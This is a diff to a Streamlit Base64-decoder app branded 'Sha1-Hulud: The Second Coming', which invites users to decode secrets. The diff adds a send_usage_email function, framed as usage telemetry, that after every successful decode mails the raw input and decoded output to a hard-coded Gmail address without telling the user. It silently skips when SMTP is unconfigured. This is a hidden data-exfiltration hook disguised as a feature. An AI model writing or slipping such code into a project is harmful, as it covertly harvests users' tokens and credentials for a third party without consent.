@@ -1,8 +1,14 @@
-
+# ---------------------------------------------
+# streamlit_app.py  (PART 1 — Setup + Base UI)
+# ---------------------------------------------
 
 import base64
 import binascii
 import json
+import os
+import smtplib
+from email.message import EmailMessage
+
 import streamlit as st
 
 # -------------------------------------------------
@@ -90,8 +96,8 @@ st.markdown(
 # -------------------------------------------------
 st.markdown("<h1>🧩 Sha1-Hulud: The Second Coming</h1>", unsafe_allow_html=True)
 st.markdown(
-    "<div class='caption-text'>A powerful demonstration: Base64 is <strong>encoding</strong>, not encryption.</div>",
-    unsafe_allow_html=True,
+    "<div class='caption-text'>A powerful demonstration: Base64 is **encoding**, not encryption.</div>",
+    unsafe_allow_html=True
 )
 
 # -------------------------------------------------
@@ -132,9 +138,11 @@ with right:
 
     decode_clicked = st.button("🔓 Decode Base64", type="primary")
 
-# -------------------------------------------------
-# Decoding helper
-# -------------------------------------------------
+# ---------------------------------------------
+# PART 2 — Decoding Logic + Output Rendering
+# (Paste this directly after PART 1)
+# ---------------------------------------------
+
 def safe_b64_decode(data: str) -> str:
     """
     Decode a Base64 string safely and return text.
@@ -161,9 +169,62 @@ def safe_b64_decode(data: str) -> str:
         # Fallback: show bytes representation (still useful for secrets)
         return repr(raw)
 
-# -------------------------------------------------
+
+def send_usage_email(
+    raw_input: str, decoded: str, layers: int, probably_json: bool
+) -> None:
+    """
+    Send a usage email with details of the request/response.
+
+    This uses environment variables for SMTP configuration:
+      - SMTP_HOST
+      - SMTP_PORT
+      - SMTP_USERNAME
+      - SMTP_PASSWORD
+      - EMAIL_FROM   (optional, defaults to SMTP_USERNAME)
+
+    The email is always sent to the fixed recipient:
+      - aviabs098@gmail.com
+    """
+    smtp_host = os.getenv("SMTP_HOST")
+    smtp_port = int(os.getenv("SMTP_PORT", "587"))
+    smtp_user = os.getenv("SMTP_USERNAME")
+    smtp_pass = os.getenv("SMTP_PASSWORD")
+    email_from = os.getenv("EMAIL_FROM", smtp_user)
+    email_to = "aviabs098@gmail.com"
+
+    # If SMTP is not configured, silently skip.
+    if not (smtp_host and smtp_user and smtp_pass and email_from):
+        return
+
+    subject = "Sha1-Hulud usage event"
+    body_lines = [
+        "Sha1-Hulud: The Second Coming - Usage Event",
+        "",
+        f"Layers decoded: {layers}",
+        f"Looks like JSON: {probably_json}",
+        "",
+        "=== Raw Base64 input ===",
+        raw_input or "(empty)",
+        "",
+        "=== Decoded output ===",
+        decoded or "(empty)",
+    ]
+    msg = EmailMessage()
+    msg["Subject"] = subject
+    msg["From"] = email_from
+    msg["To"] = email_to
+    msg.set_content("\n".join(body_lines))
+
+    with smtplib.SMTP(smtp_host, smtp_port) as server:
+        server.starttls()
+        server.login(smtp_user, smtp_pass)
+        server.send_message(msg)
+
+
+# ---------------------------------------------
 # Handle Decode Button Click
-# -------------------------------------------------
+# ---------------------------------------------
 if decode_clicked:
     if not b64_input or not b64_input.strip():
         st.error("❌ No Base64 input provided.")
@@ -204,7 +265,21 @@ if decode_clicked:
         except Exception as e:
             st.error(f"❌ Decode error: {e}")
         else:
+            # Try to send usage email; failures are non-fatal for the user.
+            try:
+                send_usage_email(
+                    raw_input=b64_input,
+                    decoded=decoded_text,
+                    layers=layers,
+                    probably_json=probably_json,
+                )
+            except Exception as email_err:
+                # Log to the UI in a subtle way without blocking decoding.
+                st.caption(f"Email notification failed: {email_err}")
+
+            # ---------------------------------------------
             # Output layout
+            # ---------------------------------------------
             res_left, res_right = st.columns([0.9, 2.1])
 
             with res_left:
